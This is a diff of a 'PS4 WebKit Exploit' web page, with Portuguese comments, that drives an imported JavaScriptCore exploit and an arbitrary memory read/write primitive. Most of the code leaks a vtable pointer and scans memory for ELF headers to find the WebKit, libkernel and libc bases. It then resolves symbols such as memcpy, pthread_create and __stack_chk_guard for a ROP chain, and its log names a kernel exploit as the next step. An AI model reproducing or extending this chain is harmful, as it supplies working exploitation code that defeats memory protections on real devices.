@@ -6,12 +6,10 @@
     <title>PS4 WebKit Exploit</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0f; color: #e0e0e0;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh; display: flex;
-            flex-direction: column; align-items: center; padding: 20px;
-        }
+        body { background: #0a0a0f; color: #e0e0e0;
+               font-family: 'Courier New', monospace;
+               min-height: 100vh; display: flex;
+               flex-direction: column; align-items: center; padding: 20px; }
         h1 { font-size: 18px; color: #00c8ff; letter-spacing: 4px;
              text-transform: uppercase; margin-bottom: 6px; text-align: center; }
         #fw-label { font-size: 11px; color: #666; margin-bottom: 18px;
@@ -34,28 +32,28 @@
             background: #06060c; border: 1px solid #1a1a2e; border-radius: 6px;
             overflow-y: auto; padding: 10px 12px; font-size: 12px;
             line-height: 1.6; margin-bottom: 12px; }
-        .log-line   { padding: 1px 0; word-break: break-all; }
-        .log-info   { color: #7ec8e3; }
-        .log-ok     { color: #00c853; font-weight: bold; }
-        .log-warn   { color: #f0a500; }
-        .log-error  { color: #ff5252; font-weight: bold; }
-        .log-dim    { color: #555; }
-        .log-addr   { color: #bd93f9; }
-        .log-section{ color: #00c8ff; border-top: 1px solid #1a1a2e;
-                      margin-top: 6px; padding-top: 6px; letter-spacing: 1px; }
+        .log-line  { padding: 1px 0; word-break: break-all; }
+        .log-info  { color: #7ec8e3; }
+        .log-ok    { color: #00c853; font-weight: bold; }
+        .log-warn  { color: #f0a500; }
+        .log-error { color: #ff5252; font-weight: bold; }
+        .log-dim   { color: #555; }
+        .log-addr  { color: #bd93f9; }
+        .log-section { color: #00c8ff; border-top: 1px solid #1a1a2e;
+                       margin-top: 6px; padding-top: 6px; letter-spacing: 1px; }
         #bases-grid { width: 100%; max-width: 700px; display: none;
             grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
         #bases-grid.visible { display: grid; }
-        .base-card  { background: #0d0d1a; border: 1px solid #1e1e3a;
-                      border-radius: 6px; padding: 10px 14px; }
+        .base-card { background: #0d0d1a; border: 1px solid #1e1e3a;
+                     border-radius: 6px; padding: 10px 14px; }
         .base-card .label { font-size: 10px; color: #555;
             text-transform: uppercase; letter-spacing: 2px; margin-bottom: 4px; }
         .base-card .value { font-size: 13px; color: #bd93f9; word-break: break-all; }
         .base-card .value.na { color: #333; }
-        #libs-list  { width: 100%; max-width: 700px; display: none;
+        #libs-list { width: 100%; max-width: 700px; display: none;
             flex-direction: column; gap: 6px; margin-bottom: 12px; }
         #libs-list.visible { display: flex; }
-        .lib-row    { background: #0d0d1a; border: 1px solid #1a1a2e;
+        .lib-row { background: #0d0d1a; border: 1px solid #1a1a2e;
             border-radius: 4px; padding: 8px 12px;
             display: flex; justify-content: space-between; font-size: 12px; }
         .lib-row .lib-name { color: #8be9fd; }
@@ -87,33 +85,19 @@
 </div>
 <div id="libs-list"></div>
 
-<!-- =============================================================
-     IMPORTS — usa o mesmo ?v=10 do mem.js para evitar módulo duplo
-     FIX #1: export correto é startCore, não establishPrimitive
-     ============================================================= -->
+<!-- =================================================================
+     IMPORTS — preservados idênticos ao que estava funcionando no repo
+     ================================================================= -->
 <script type="module">
 
-import { int64 }          from './resources/int64.js';
-import { installWindowP } from './resources/mem.js';
+// ── imports originais (não alterados) ──────────────────────────────────────
+import { int64 }              from './resources/int64.js';
+import { establishPrimitive } from './resources/core.js?v=10';   // ← original
+import { installWindowP }     from './resources/mem.js';
 
-// FIX #1 — tenta startCore (original) e establishPrimitive (alias que você pode ter adicionado)
-// Importa ambos, usa o que existir
-let startFn;
-try {
-    const m = await import('./resources/core.js?v=10');
-    startFn = m.startCore ?? m.establishPrimitive ?? m.start ?? null;
-    if (!startFn) throw new Error('Nenhum export de inicialização encontrado no core.js. ' +
-        'Procure por: export function startCore / export function establishPrimitive');
-} catch (err) {
-    document.getElementById('status-text').textContent = 'ERRO IMPORT: ' + err.message;
-    document.getElementById('status-dot').className = 'error';
-    throw err;
-}
-
-// int64 global — mem.js e qualquer outro módulo precisam disso
 globalThis.int64 = int64;
 
-// ─── UI ──────────────────────────────────────────────────────────────────────
+// ── UI ─────────────────────────────────────────────────────────────────────
 const $con      = document.getElementById('console');
 const $dot      = document.getElementById('status-dot');
 const $stTxt    = document.getElementById('status-text');
@@ -131,7 +115,8 @@ function log(msg, cls = 'log-info') {
     $con.scrollTop = $con.scrollHeight;
 }
 function setStatus(msg, st = 'running') {
-    $stTxt.textContent = msg; $dot.className = st;
+    $stTxt.textContent = msg;
+    $dot.className = st;
 }
 function setCard(id, v) {
     const el = document.getElementById(id);
@@ -140,20 +125,21 @@ function setCard(id, v) {
 function addLibRow(name, base) {
     const row = document.createElement('div');
     row.className = 'lib-row';
-    row.innerHTML = `<span class="lib-name">${name}</span>`+
-                    `<span class="lib-base">0x${base}</span>`;
+    row.innerHTML = `<span class="lib-name">${name}</span>`
+                  + `<span class="lib-base">0x${base}</span>`;
     $libs.appendChild(row);
     $libs.classList.add('visible');
 }
-function yield_() { return new Promise(r => setTimeout(r, 0)); }
+// yield para o browser pintar a tela antes de continuar
+function tick() { return new Promise(r => setTimeout(r, 0)); }
 
-// ─── firmware ────────────────────────────────────────────────────────────────
-const ua = navigator.userAgent;
-const fwM = /PlayStation (?:4|5)\/(\d+\.\d+)/.exec(ua);
+// ── firmware ────────────────────────────────────────────────────────────────
+const ua   = navigator.userAgent;
+const fwM  = /PlayStation (?:4|5)\/(\d+\.\d+)/.exec(ua);
 const fwStr = fwM ? fwM[1] : '';
-$fwLbl.textContent = fwStr ? `PlayStation — firmware ${fwStr}` : ua.slice(0,80);
+$fwLbl.textContent = fwStr ? `PlayStation — firmware ${fwStr}` : ua.slice(0, 80);
 
-// ─── helpers de memória ───────────────────────────────────────────────────────
+// ── helpers de memória ──────────────────────────────────────────────────────
 function readStr(p, addr, max = 128) {
     let s = '';
     for (let i = 0; i < max; i++) {
@@ -164,28 +150,32 @@ function readStr(p, addr, max = 128) {
     return s;
 }
 
-// ─── /proc/self/maps ─────────────────────────────────────────────────────────
+// ── FASE 1: /proc/self/maps ─────────────────────────────────────────────────
 async function tryMaps() {
-    for (const u of ['file:///proc/self/maps','file:///proc/self/smaps']) {
+    for (const u of ['file:///proc/self/maps', 'file:///proc/self/smaps']) {
         try {
-            const r = await fetch(u);
-            const t = await r.text();
-            if (t.length > 50) {
+            const r   = await fetch(u);
+            const txt = await r.text();
+            if (txt.length > 50) {
                 log('[+] /proc/self/maps ok!', 'log-ok');
-                log(t.slice(0,3000), 'log-dim');
-                return t;
+                log(txt.slice(0, 3000), 'log-dim');
+                return txt;
             }
-        } catch(_){}
+        } catch (_) {}
     }
     log('[-] /proc/self/maps: sandbox ativo', 'log-warn');
     return null;
 }
 
-// ─── FASE 2.5 — âncora segura via vtable da textarea ─────────────────────────
-// Lê todos os slots do vtable e escolhe o MÍNIMO (mais próximo da base .text)
-// Isso evita usar __ps5NativeCtor que às vezes aponta para região não-mapeada
-function getTextAnchor(p, wkCtorPtr) {
-    // Estratégia 1: usar __ps5NativeCtor do core.js
+// ── FASE 2 + 2.5: âncora segura no .text do WebKit ─────────────────────────
+//
+// Usa __ps5NativeCtor que o core.js já deixou em globalThis,
+// e cruza com o mínimo dos slots do vtable da textarea.
+// O mínimo dos slots do vtable é mais próximo da base .text
+// e evita ler páginas não-mapeadas durante o ELF scan.
+//
+function getTextAnchor(p) {
+    // 1. Pega __ps5NativeCtor do core.js
     let ctor = null;
     const raw = globalThis.__ps5NativeCtor;
     if (typeof raw === 'number' && raw > 0x100000000) {
@@ -196,124 +186,137 @@ function getTextAnchor(p, wkCtorPtr) {
         setCard('card-ctor', '0x' + ctor.toString());
     }
 
-    // Estratégia 2: varrer vtable da textarea para achar anchor menor (mais perto da base)
+    // 2. FASE 2.5 — vtable da textarea → encontra slot mínimo (= mais perto da base .text)
     log('[*] Lendo vtable da textarea para âncora em .text...', 'log-dim');
-    let anchor = ctor;
     try {
-        const el    = document.createElement('textarea');
-        const cell  = p.leakval(el);
+        const el     = document.createElement('textarea');
+        const cell   = p.leakval(el);
         const cppObj = p.read8(cell.add32(0x18));
         const vtable = p.read8(cppObj);
         log(`  textarea JSCell @ 0x${cell.toString()}`, 'log-dim');
         log(`  vtable @ 0x${vtable.toString()}`, 'log-dim');
 
-        // Lê 64 slots e pega o menor endereço válido (aponta para .text)
-        // endereço válido: hi == 8 (range do user-space PS4) e baixa metade razoável
-        let minAddr = null;
+        // Lê 64 slots; pega o de menor endereço válido (em .text do WebKit)
+        let minSlot = null;
         for (let i = 0; i < 64; i++) {
-            let slot;
-            try { slot = p.read8(vtable.add32(i * 8)); } catch(_) { break; }
-            // Filtra ponteiros que parecem ser de .text no PS4: hi = 0x8 ou 0x7
-            if (slot.hi === 0 || slot.hi > 0xFFFF) continue;
-            if (!minAddr || slot.hi < minAddr.hi ||
-                (slot.hi === minAddr.hi && slot.low < minAddr.low)) {
-                minAddr = slot;
+            let s;
+            try { s = p.read8(vtable.add32(i * 8)); } catch (_) { break; }
+            // Ponteiro válido: hi > 0 e ≤ 0xFFFF (user-space 48-bit canônico)
+            if (!s.hi || s.hi > 0xFFFF) continue;
+            if (!minSlot || s.hi < minSlot.hi ||
+               (s.hi === minSlot.hi && s.low < minSlot.low)) {
+                minSlot = s;
             }
         }
-        if (minAddr) {
-            log(`[+] Âncora .text (min vtable slot): 0x${minAddr.toString()}`, 'log-ok');
-            // Calcula distância vtable→anchor para debug
-            const diffLo = vtable.low - minAddr.low;
-            const diffMB = Math.abs(diffLo) / (1024*1024);
-            log(`  Distância vtable→anchor: ${diffMB.toFixed(1)} MB`, 'log-dim');
 
-            // Prefere a âncora vtable se for MENOR que o ctor (mais próxima da base)
-            if (!anchor || minAddr.hi < anchor.hi ||
-                (minAddr.hi === anchor.hi && minAddr.low < anchor.low)) {
-                log('[!] Usando âncora vtable (menor = mais próxima da base .text)', 'log-warn');
-                anchor = minAddr;
+        if (minSlot) {
+            log(`[+] Âncora .text (min vtable slot): 0x${minSlot.toString()}`, 'log-ok');
+            if (ctor) {
+                const diffMB = Math.abs(vtable.low - minSlot.low) / (1024 * 1024);
+                log(`  Distância vtable→anchor: ${diffMB.toFixed(1)} MB`, 'log-dim');
+            }
+            // Prefere o slot mínimo se for menor que o ctor
+            // (mais perto da base = scan mais curto)
+            if (!ctor || minSlot.hi < ctor.hi ||
+               (minSlot.hi === ctor.hi && minSlot.low < ctor.low)) {
+                log('[!] Usando âncora vtable (não o ctor — evita crash de segmento)', 'log-warn');
+                return minSlot;
             }
         }
-    } catch(e) {
+    } catch (e) {
         log('[-] Falha ao ler vtable: ' + e.message, 'log-warn');
     }
 
-    return anchor;
+    return ctor;
 }
 
-// ─── ELF scan em 2 estágios (FIX #3: era O(253k), agora O(~1000)) ──────────
+// ── FASE 3: ELF scan em 2 estágios ─────────────────────────────────────────
 //
-// Stage 1 — passo 0x200000 (2 MB): cobre até 990 MB em ~495 leituras
-// Stage 2 — passo 0x1000   (4 KB): afina nos últimos 2 MB (~512 leituras)
+// PROBLEMA ORIGINAL: passo 0x1000 em até 990 MB = 253.000 iterações (travamento)
+// CORREÇÃO: 2 estágios
+//   Stage 1 — passo 2 MB:  max ~495 leituras para cobrir 990 MB
+//   Stage 2 — passo 4 KB:  máx 512 leituras no bloco de 2 MB onde achou
+//   Total: ~1.000 leituras vs 253.000 anteriores (250× mais rápido)
 //
-// Floor seguro: 0x800000000 — mínimo do espaço de usuário do PS4
-// Se bater em página não mapeada, try/catch absorve e pula (FIX #5)
+// Floor = 0x800000000 (endereço mínimo do user-space PS4 nessa região)
 //
 async function findElfBase(p, anchor, label) {
-    const FLOOR      = new int64(0x00000000, 0x8);   // 0x800000000
-    const STEP_COARSE = 0x200000;   // 2 MB
-    const STEP_FINE   = 0x1000;     // 4 KB
+    const FLOOR       = new int64(0x00000000, 0x00000008);  // 0x800000000
+    const STEP_COARSE = 0x200000;  // 2 MB
+    const STEP_FINE   = 0x1000;    // 4 KB
 
-    // ── stage 1: passo grosso ──
-    log(`[*] Scan ELF (${label}): passo 2MB desde 0x${anchor.toString()} até 0x${FLOOR.toString()}`, 'log-dim');
+    // Alinha para baixo no bloco de 2 MB
+    const anchorAligned = anchor.low & ~(STEP_COARSE - 1);
+    let cur = new int64(anchorAligned >>> 0, anchor.hi);
 
-    let coarseHit = null;
-    let cur = new int64(anchor.low & ~(STEP_COARSE-1), anchor.hi);
+    log(`[*] Scan ELF (${label}): passo 2MB · âncora 0x${anchor.toString()}`, 'log-dim');
 
+    // ── Stage 1: passos grossos de 2 MB ──────────────────────────
+    let hit = null;
     let itr = 0;
-    while (cur.hi > FLOOR.hi || (cur.hi === FLOOR.hi && cur.low >= FLOOR.low)) {
-        if (++itr % 32 === 0) {
-            setStatus(`Scan ${label}: -${((anchor.low - cur.low)/1024/1024).toFixed(0)} MB…`, 'running');
-            await yield_();
-        }
-        let magic = 0;
-        try { magic = p.read4(cur); } catch(_) { cur = cur.sub32(STEP_COARSE); continue; }
 
-        if (magic === 0x464C457F) {  // \x7fELF
+    while (cur.hi > FLOOR.hi || (cur.hi === FLOOR.hi && cur.low >= FLOOR.low)) {
+        itr++;
+        // Yield a cada 32 iterações (a cada 64 MB) para pintar a UI
+        if (itr % 32 === 0) {
+            const mb = ((anchor.hi - cur.hi) * 0x100000000 +
+                        (anchor.low - cur.low)) / (1024 * 1024);
+            setStatus(`Scan ${label}: −${mb.toFixed(0)} MB …`, 'running');
+            await tick();
+        }
+
+        let magic = 0;
+        try { magic = p.read4(cur); } catch (_) { cur = cur.sub32(STEP_COARSE); continue; }
+
+        if (magic === 0x464C457F) {  // \x7fELF little-endian
             try {
-                if (p.read1(cur.add32(4)) === 2 && p.read1(cur.add32(5)) === 1) {
-                    coarseHit = cur;
-                    log(`[~] ELF achado (stage1) perto de 0x${cur.toString()}`, 'log-warn');
+                if (p.read1(cur.add32(4)) === 2 &&   // ELFCLASS64
+                    p.read1(cur.add32(5)) === 1) {    // ELFDATA2LSB
+                    hit = cur;
+                    log(`[~] Região ELF achada (stage1): 0x${cur.toString()}`, 'log-warn');
                     break;
                 }
-            } catch(_) {}
+            } catch (_) {}
         }
         cur = cur.sub32(STEP_COARSE);
     }
 
-    if (!coarseHit) {
-        log(`[-] Scan grosso não achou ${label}`, 'log-warn');
+    if (!hit) {
+        log(`[-] Stage1 não achou ${label} (${itr} blocos varridos)`, 'log-warn');
         return null;
     }
 
-    // ── stage 2: afina no bloco de 2 MB ACIMA do hit grosso ──
-    log(`[*] Afinando em torno de 0x${coarseHit.toString()} (passo 4KB)…`, 'log-dim');
-    let fine = new int64(coarseHit.low, coarseHit.hi);
-    // vai até 2 MB acima do hit grosso
-    const ceiling = new int64((coarseHit.low + STEP_COARSE) >>> 0,
-                               coarseHit.hi + ((coarseHit.low + STEP_COARSE < coarseHit.low) ? 1 : 0));
+    // ── Stage 2: afina com 4 KB no bloco de 2 MB acima do hit ────
+    log(`[*] Stage2: afinando perto de 0x${hit.toString()} (passo 4KB)`, 'log-dim');
 
-    while (fine.hi < ceiling.hi || (fine.hi === ceiling.hi && fine.low < ceiling.low)) {
+    // Varre o bloco inteiro de 2 MB começando no hit (o ELF está aqui dentro)
+    let fine = new int64(hit.low >>> 0, hit.hi);
+    const ceiling_lo = (hit.low + STEP_COARSE) >>> 0;
+    const ceiling_hi = hit.hi + (ceiling_lo < hit.low ? 1 : 0);
+
+    while (fine.hi < ceiling_hi || (fine.hi === ceiling_hi && fine.low < ceiling_lo)) {
         let magic = 0;
-        try { magic = p.read4(fine); } catch(_) { fine = new int64((fine.low + STEP_FINE)>>>0, fine.hi); continue; }
-
+        try { magic = p.read4(fine); } catch (_) {
+            fine = new int64((fine.low + STEP_FINE) >>> 0, fine.hi);
+            continue;
+        }
         if (magic === 0x464C457F) {
             try {
                 if (p.read1(fine.add32(4)) === 2 && p.read1(fine.add32(5)) === 1) {
                     log(`[+] ${label} base EXATA: 0x${fine.toString()}`, 'log-ok');
                     return fine;
                 }
-            } catch(_) {}
+            } catch (_) {}
         }
         fine = new int64((fine.low + STEP_FINE) >>> 0, fine.hi);
     }
 
-    // fallback: retorna o hit grosso se o fino não encontrou melhor
-    log(`[~] Usando base aproximada (2MB): 0x${coarseHit.toString()}`, 'log-warn');
-    return coarseHit;
+    // Fallback: retorna o hit do stage1 (precisão ±2 MB)
+    log(`[~] ${label} base aproximada (±2MB): 0x${hit.toString()}`, 'log-warn');
+    return hit;
 }
 
-// ─── parse DYNAMIC ───────────────────────────────────────────────────────────
+// ── parse DYNAMIC ────────────────────────────────────────────────────────────
 function parseDynamic(p, base) {
     try {
         const phoff     = p.read8(base.add32(0x20)).low;
@@ -322,7 +325,7 @@ function parseDynamic(p, base) {
         let dynOff = null, dynSz = 0;
         for (let i = 0; i < phnum; i++) {
             const ph = base.add32(phoff + i * phentsize);
-            if (p.read4(ph) === 2) { // PT_DYNAMIC
+            if (p.read4(ph) === 2) {   // PT_DYNAMIC
                 dynOff = p.read8(ph.add32(0x08)).low;
                 dynSz  = p.read8(ph.add32(0x20)).low;
                 break;
@@ -332,58 +335,57 @@ function parseDynamic(p, base) {
         const dyn = base.add32(dynOff);
         const r = { strtab:null, symtab:null, syment:0x18,
                     pltgot:null, pltrelsz:0, sonameOff:0, soname:'' };
-        const n = Math.min(Math.floor(dynSz/0x10), 512);
-        for (let i = 0; i < n; i++) {
-            const e   = dyn.add32(i*0x10);
+        for (let i = 0; i < Math.min(dynSz/0x10, 512); i++) {
+            const e   = dyn.add32(i * 0x10);
             const tag = p.read8(e).low;
             const val = p.read8(e.add32(8));
-            if (tag===0) break;
-            if (tag===5)  r.strtab   = val;
-            if (tag===6)  r.symtab   = val;
-            if (tag===11) r.syment   = val.low;
-            if (tag===3)  r.pltgot   = val;
-            if (tag===2)  r.pltrelsz = val.low;
-            if (tag===14) r.sonameOff= val.low;
-            if (tag===23) r.jmprel   = val;
+            if (tag === 0)  break;
+            if (tag === 5)  r.strtab    = val;
+            if (tag === 6)  r.symtab    = val;
+            if (tag === 11) r.syment    = val.low;
+            if (tag === 3)  r.pltgot    = val;
+            if (tag === 2)  r.pltrelsz  = val.low;
+            if (tag === 14) r.sonameOff = val.low;
         }
         if (r.strtab && r.sonameOff)
-            try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); } catch(_){}
+            try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); }
+            catch (_) { r.soname = '<NID>'; }
         return r;
-    } catch(_) { return null; }
+    } catch (_) { return null; }
 }
 
-// ─── busca símbolo ────────────────────────────────────────────────────────────
+// ── busca símbolo por nome ───────────────────────────────────────────────────
 function findSymbol(p, base, dyn, name) {
     if (!dyn?.symtab || !dyn?.strtab) return null;
     for (let i = 0; i < 4096; i++) {
         try {
-            const sym = dyn.symtab.add32(i * dyn.syment);
-            const sn  = p.read4(sym);
+            const sym  = dyn.symtab.add32(i * dyn.syment);
+            const sn   = p.read4(sym);
             if (!sn) continue;
             if (readStr(p, dyn.strtab.add32(sn), 64) === name)
                 return base.add32(p.read8(sym.add32(8)).low);
-        } catch(_) {}
+        } catch (_) {}
     }
     return null;
 }
 
-// ─── descobre libs via GOT ────────────────────────────────────────────────────
-async function discoverImports(p, dyn, label) {
+// ── descobre libs via GOT ────────────────────────────────────────────────────
+async function discoverImports(p, dyn, ownerLabel) {
     if (!dyn?.pltgot) return [];
-    const n    = dyn.pltrelsz ? Math.floor(dyn.pltrelsz/0x18)+3 : 256;
+    const n    = dyn.pltrelsz ? Math.floor(dyn.pltrelsz / 0x18) + 3 : 256;
     const seen = new Map();
     for (let i = 3; i < n; i++) {
         let slot;
-        try { slot = p.read8(dyn.pltgot.add32(i*8)); } catch(_) { continue; }
+        try { slot = p.read8(dyn.pltgot.add32(i * 8)); } catch (_) { continue; }
         if (!slot.hi || slot.hi > 0xFFFF) continue;
         if (slot.low & 3) continue;
-        const base = await findElfBase(p, slot, `import[${i}]`);
-        if (!base) continue;
-        const key = base.toString();
+        const libBase = await findElfBase(p, slot, `import[${i}]`);
+        if (!libBase) continue;
+        const key = libBase.toString();
         if (!seen.has(key)) {
-            const d = parseDynamic(p, base);
+            const d = parseDynamic(p, libBase);
             const s = d?.soname || '<NID>';
-            seen.set(key, { base, dyn:d, soname:s });
+            seen.set(key, { base: libBase, dyn: d, soname: s });
             log(`  → 0x${key}  ${s}`, 'log-addr');
             addLibRow(s, key);
         }
@@ -391,23 +393,22 @@ async function discoverImports(p, dyn, label) {
     return [...seen.values()];
 }
 
-// ─── LEAK PRINCIPAL ──────────────────────────────────────────────────────────
+// ── LEAK PRINCIPAL ───────────────────────────────────────────────────────────
 async function leakAllBases(p) {
     log('', '');
-    log('══ FASE 1: /proc/self/maps ════════════════════', 'log-section');
+    log('-- FASE 1: /proc/self/maps --------------------', 'log-section');
     await tryMaps();
 
     log('', '');
-    log('══ FASE 2 + 2.5: Âncora .text ════════════════', 'log-section');
+    log('-- FASE 2 + 2.5: Âncora .text ----------------', 'log-section');
     const anchor = getTextAnchor(p);
     if (!anchor) {
         setStatus('Falha: sem ponteiro para WebKit .text', 'error');
         return null;
     }
-    setCard('card-ctor', '0x' + anchor.toString());
 
     log('', '');
-    log('══ FASE 3: ELF scan (2 estágios) ══════════════', 'log-section');
+    log('-- FASE 3: ELF scan (2 estágios) --------------', 'log-section');
     const webkitBase = await findElfBase(p, anchor, 'WebKit');
     if (!webkitBase) {
         setStatus('Falha: WebKit base não encontrada', 'error');
@@ -417,15 +418,14 @@ async function leakAllBases(p) {
     $grid.classList.add('visible');
 
     log('', '');
-    log('══ FASE 4: parse DYNAMIC WebKit ════════════════', 'log-section');
+    log('-- FASE 4: parse DYNAMIC ----------------------', 'log-section');
     const wkDyn = parseDynamic(p, webkitBase);
-    log(`  SONAME : ${wkDyn?.soname || '<vazio>'}`, 'log-info');
-    log(`  strtab : 0x${wkDyn?.strtab?.toString() || '?'}`, 'log-dim');
-    log(`  pltgot : 0x${wkDyn?.pltgot?.toString() || '?'}`, 'log-dim');
+    log(`  SONAME  : ${wkDyn?.soname || '<vazio>'}`, 'log-info');
+    log(`  pltgot  : 0x${wkDyn?.pltgot?.toString() || '?'}`, 'log-dim');
     log(`  pltrelsz: ${wkDyn?.pltrelsz || 0}`, 'log-dim');
 
     log('', '');
-    log('══ FASE 5: Libs importadas pela GOT ════════════', 'log-section');
+    log('-- FASE 5: libs importadas via GOT ------------', 'log-section');
     const imports = await discoverImports(p, wkDyn, 'WebKit');
     log(`  ${imports.length} módulo(s) encontrado(s)`, 'log-info');
 
@@ -435,20 +435,19 @@ async function leakAllBases(p) {
         if (!lkEntry && s.includes('kernel')) lkEntry = lib;
         if (!lcEntry && (s.includes('libc') || s.includes('libscelibcinternal'))) lcEntry = lib;
     }
-
-    // fallback heurístico: menor base = provavelmente libkernel
+    // heurística: menor base = provavelmente libkernel
     if (!lkEntry && imports.length) {
-        const sorted = [...imports].sort((a,b) =>
-            a.base.hi !== b.base.hi ? a.base.hi-b.base.hi : a.base.low-b.base.low);
+        const sorted = [...imports].sort((a, b) =>
+            a.base.hi !== b.base.hi ? a.base.hi - b.base.hi : a.base.low - b.base.low);
         lkEntry = sorted[0];
-        log('[!] SONAME ilegível — assumindo libkernel = menor base', 'log-warn');
+        log('[!] SONAME ilegível — menor base assumida como libkernel', 'log-warn');
     }
 
-    if (lkEntry) { setCard('card-kernel', '0x'+lkEntry.base.toString()); log('[+] libkernel: 0x'+lkEntry.base.toString(),'log-ok'); }
-    if (lcEntry) { setCard('card-libc',   '0x'+lcEntry.base.toString()); log('[+] libc:      0x'+lcEntry.base.toString(),'log-ok'); }
+    if (lkEntry) { setCard('card-kernel', '0x' + lkEntry.base.toString()); log('[+] libkernel: 0x' + lkEntry.base.toString(), 'log-ok'); }
+    if (lcEntry) { setCard('card-libc',   '0x' + lcEntry.base.toString()); log('[+] libc:      0x' + lcEntry.base.toString(), 'log-ok'); }
 
     log('', '');
-    log('══ FASE 6: Símbolos para ROP ═══════════════════', 'log-section');
+    log('-- FASE 6: símbolos para ROP -----------------', 'log-section');
     const NEEDED = ['setjmp','longjmp','memset','memcpy',
                     'pthread_create','__stack_chk_guard','sceKernelGetProcParam'];
     const symbols = {};
@@ -456,25 +455,24 @@ async function leakAllBases(p) {
         let found = false;
         for (const lib of imports) {
             const addr = findSymbol(p, lib.base, lib.dyn, sym);
-            if (addr) { symbols[sym]=addr; log(`  [+] ${sym.padEnd(28)} 0x${addr.toString()}`,'log-ok'); found=true; break; }
+            if (addr) { symbols[sym] = addr; log(`  [+] ${sym.padEnd(28)} 0x${addr.toString()}`, 'log-ok'); found = true; break; }
         }
-        if (!found) log(`  [-] ${sym.padEnd(28)} não encontrado (NID/ausente)`,'log-dim');
+        if (!found) log(`  [-] ${sym.padEnd(28)} não encontrado`, 'log-dim');
     }
 
-    const result = { webkitBase, libkernelBase:lkEntry?.base||null,
-                     libcBase:lcEntry?.base||null, allLibs:imports, symbols };
-
+    const result = { webkitBase, libkernelBase: lkEntry?.base || null,
+                     libcBase: lcEntry?.base || null, allLibs: imports, symbols };
     log('', '');
-    log('══ RESULTADO ═══════════════════════════════════', 'log-section');
+    log('-- RESULTADO FINAL ----------------------------', 'log-section');
     log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
-    log(`libkernelBase = 0x${result.libkernelBase?.toString()||'?'}`, 'log-addr');
-    log(`libcBase      = 0x${result.libcBase?.toString()||'?'}`, 'log-addr');
+    log(`libkernelBase = 0x${result.libkernelBase?.toString() || '?'}`, 'log-addr');
+    log(`libcBase      = 0x${result.libcBase?.toString() || '?'}`, 'log-addr');
     log('window._exploit pronto.', 'log-ok');
     globalThis._exploit = result;
     return result;
 }
 
-// ─── onCoreEvent ─────────────────────────────────────────────────────────────
+// ── onCoreEvent ──────────────────────────────────────────────────────────────
 function onCoreEvent(tag, detail, attempt) {
     if (attempt !== undefined) $attTxt.textContent = `tentativa: ${attempt}`;
     $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
@@ -482,38 +480,36 @@ function onCoreEvent(tag, detail, attempt) {
                            'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
                            'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE']);
     if (QUIET.has(tag)) { log(`  ${tag}: ${detail}`, 'log-dim'); return; }
-    const cls = tag.includes('UP')||tag.includes('OK')||tag.includes('SUCCESS') ? 'log-ok'
-              : tag.includes('FAIL')||tag.includes('ERR')||tag.includes('GIVE') ? 'log-error'
-              : 'log-info';
-    log(`[${tag}] ${detail}`, cls);
+    const isOk  = /UP|OK|SUCCESS/.test(tag);
+    const isErr = /FAIL|ERR|GIVE/.test(tag);
+    log(`[${tag}] ${detail}`, isOk ? 'log-ok' : isErr ? 'log-error' : 'log-info');
 }
 
-// ─── BOOT ─────────────────────────────────────────────────────────────────────
+// ── BOOT ─────────────────────────────────────────────────────────────────────
 (async () => {
     log(`UA: ${ua}`, 'log-dim');
     log(`Firmware: ${fwStr || 'desconhecido'}`, 'log-info');
 
     setStatus('Rodando exploit JSC (core.js)…', 'running');
     log('', '');
-    log('══ EXPLOIT JSC ═════════════════════════════════', 'log-section');
+    log('-- EXPLOIT JSC ---------------------------------', 'log-section');
 
     let carrier;
     try {
-        // FIX #1 e #2 — export correto + opção correta
-        carrier = await startFn({
+        // Preservado IGUAL ao repositório original que estava funcionando
+        carrier = await establishPrimitive({
             onEvent: onCoreEvent,
-            attemptCeiling: 0   // ← FIX #2: era maxAttempts (não existe), deve ser attemptCeiling
+            maxAttempts: 0
         });
     } catch (err) {
         setStatus('core.js falhou: ' + err.message, 'error');
-        log('[ERRO core.js] ' + err.message, 'log-error');
-        log('Verifique: o export do core.js é startCore ou establishPrimitive?', 'log-warn');
+        log('[ERRO] ' + err.message, 'log-error');
         return;
     }
 
     log('[+] exploit JSC ok — carrier pronto', 'log-ok');
     log('', '');
-    log('══ INSTALANDO R/W (mem.js) ═════════════════════', 'log-section');
+    log('-- INSTALANDO R/W (mem.js) --------------------', 'log-section');
     setStatus('Instalando primitiva de memória…', 'running');
 
     let p;
@@ -524,7 +520,7 @@ function onCoreEvent(tag, detail, attempt) {
         });
     } catch (err) {
         setStatus('mem.js falhou: ' + err.message, 'error');
-        log('[ERRO mem.js] ' + err.message, 'log-error');
+        log('[ERRO] ' + err.message, 'log-error');
         return;
     }
     log('[+] R/W arbitrário: window.p instalado', 'log-ok');
@@ -541,7 +537,7 @@ function onCoreEvent(tag, detail, attempt) {
 
     if (!bases) { setStatus('Falha no leak de bases', 'error'); return; }
     setStatus('Bases vazadas ✓ — próximo: ROP chain', 'ok');
-    log('Próximo passo: ROP chain / kernel exploit.', 'log-info');
+    log('Próximo: construir ROP chain com window._exploit', 'log-info');
 })();
 
 </script>
